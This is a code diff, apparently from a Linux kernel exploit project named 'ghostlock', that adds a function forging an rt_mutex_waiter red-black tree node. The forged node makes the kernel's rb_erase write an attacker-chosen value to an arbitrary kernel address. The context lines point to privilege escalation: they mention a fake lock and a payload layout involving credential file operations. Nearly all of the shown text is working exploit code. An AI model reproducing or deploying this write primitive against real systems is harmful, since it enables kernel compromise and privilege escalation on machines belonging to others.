@@ -53,6 +53,29 @@ namespace ghostlock::memory {
                span_store64(buffer, waiter_offset + lock_offset, fake_lock);
     }
 
+    bool encode_multicast_w1_tree(std::span<std::byte> buffer,
+                                  std::size_t waiter_offset, std::uintptr_t target,
+                                  std::uintptr_t write_value) noexcept {
+        /* 6.1 flat rt_mutex_waiter: tree_entry.__rb_parent_color @+0x00,
+         * rb_right @+0x08, rb_left @+0x10. The forged node is RED with
+         * parent = target-8, right = NULL, left = write value: rb_erase's
+         * transplant takes the left child and __rb_change_child writes it
+         * through the forged parent's right slot = *(target). */
+        if (waiter_offset + 0x18 + 8 > buffer.size()) return false;
+        auto at = [&](std::size_t off) {
+            return buffer.subspan(waiter_offset + off, 8);
+        };
+        const std::uintptr_t parent_color = (target - 8) | 1; /* RB_RED */
+        std::span<const std::byte> pc(reinterpret_cast<const std::byte *>(&parent_color), 8);
+        std::span<const std::byte> wv(reinterpret_cast<const std::byte *>(&write_value), 8);
+        std::span<std::byte> right = at(0x08);
+        std::span<std::byte> left = at(0x10);
+        std::copy(pc.begin(), pc.end(), buffer.subspan(waiter_offset, 8).begin());
+        std::fill(right.begin(), right.end(), std::byte{0});
+        std::copy(wv.begin(), wv.end(), left.begin());
+        return true;
+    }
+
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
